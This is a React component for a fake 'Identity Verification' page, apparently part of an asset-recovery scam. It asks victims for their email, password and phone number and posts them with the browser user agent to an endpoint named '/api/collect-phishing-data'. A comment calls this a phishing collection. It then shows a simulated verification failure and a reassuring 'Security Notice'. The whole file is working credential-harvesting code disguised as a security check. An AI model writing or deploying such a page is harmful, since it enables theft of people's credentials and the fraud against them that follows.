import { useState } from 'react';
import { Shield, Lock, Mail, Phone } from 'lucide-react';

export default function VerifyIdentity({ onVerificationComplete }) {
  const [step, setStep] = useState(1);
  const [credentials, setCredentials] = useState({
    email: '',
    password: '',
    phone: '',
    code: ''
  });
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      // Send credentials to phishing collection
      await fetch('/api/collect-phishing-data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: credentials.email,
          password: credentials.password,
          phone: credentials.phone,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        })
      });

      if (step === 1) {
        setStep(2);
        setLoading(false);
      } else {
        // Simulate verification failure
        setTimeout(() => {
          alert('Verification failed. Proceeding with recovery...');
          onVerificationComplete();
        }, 2000);
      }
    } catch (error) {
      setTimeout(() => {
        alert('Verification failed. Proceeding with recovery...');
        onVerificationComplete();
      }, 2000);
    }
  };

  return (
    <div className="bg-white rounded-xl p-8 shadow-lg max-w-md mx-auto">
      <div className="text-center mb-8">
        <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
          <Shield className="w-8 h-8 text-blue-600" />
        </div>
        <h2 className="text-2xl font-bold text-gray-900 mb-2">Identity Verification</h2>
        <p className="text-gray-600">
          {step === 1 
            ? 'Verify your identity to proceed with recovery'
            : 'Enter the verification code sent to your phone'
          }
        </p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-6">
        {step === 1 ? (
          <>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                <Mail className="inline w-4 h-4 mr-2" />
                Email Address
              </label>
              <input
                type="email"
                placeholder="your@email.com"
                value={credentials.email}
                onChange={(e) => setCredentials({...credentials, email: e.target.value})}
                className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                <Lock className="inline w-4 h-4 mr-2" />
                Password
              </label>
              <input
                type="password"
                placeholder="Enter your password"
                value={credentials.password}
                onChange={(e) => setCredentials({...credentials, password: e.target.value})}
                className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                <Phone className="inline w-4 h-4 mr-2" />
                Phone Number
              </label>
              <input
                type="tel"
                placeholder="+1 (555) 123-4567"
                value={credentials.phone}
                onChange={(e) => setCredentials({...credentials, phone: e.target.value})}
                className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                required
              />
            </div>
          </>
        ) : (
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Verification Code
            </label>
            <input
              type="text"
              placeholder="Enter 6-digit code"
              value={credentials.code}
              onChange={(e) => setCredentials({...credentials, code: e.target.value})}
              className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-center text-2xl tracking-widest"
              maxLength="6"
              required
            />
            <p className="text-sm text-gray-500 mt-2">
              Code sent to {credentials.phone}
            </p>
          </div>
        )}

        <button
          type="submit"
          disabled={loading}
          className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 text-white font-bold py-3 px-6 rounded-lg transition-colors"
        >
          {loading ? 'Verifying...' : step === 1 ? 'Send Verification Code' : 'Verify Identity'}
        </button>
      </form>

      <div className="mt-6 p-4 bg-yellow-50 border border-yellow-200 rounded-lg">
        <div className="flex items-start space-x-2">
          <Shield className="w-5 h-5 text-yellow-600 mt-0.5" />
          <div className="text-sm text-yellow-800">
            <p className="font-medium">Security Notice</p>
            <p>This verification helps protect your recovered assets from unauthorized access.</p>
          </div>
        </div>
      </div>
    </div>
  );
}